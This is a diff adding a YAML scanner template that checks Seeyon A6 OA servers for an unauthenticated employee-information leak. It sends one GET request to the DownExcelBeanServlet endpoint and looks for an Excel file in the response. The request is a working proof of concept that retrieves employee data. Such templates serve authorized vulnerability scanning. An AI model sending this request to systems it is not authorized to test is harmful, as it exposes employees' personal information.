@@ -1,0 +1,18 @@
+id: seeyon-a6-employee-info-leak
+
+info:
+    name: seeyon-a6-employee-info-leak
+    author: sakura404x
+    severity: high
+
+manual: true
+transport: http
+rules:
+    poc10:
+        request:
+            cache: true
+            method: GET
+            path: /yyoa/DownExcelBeanServlet?contenttype=username&contentvalue=&state=1&per_id=0
+        expression: response.status == 200 && response.body.bcontains(b"[Content_Types].xml") && response.body.bcontains(b"Excel.Sheet")
+expression: poc10()
+
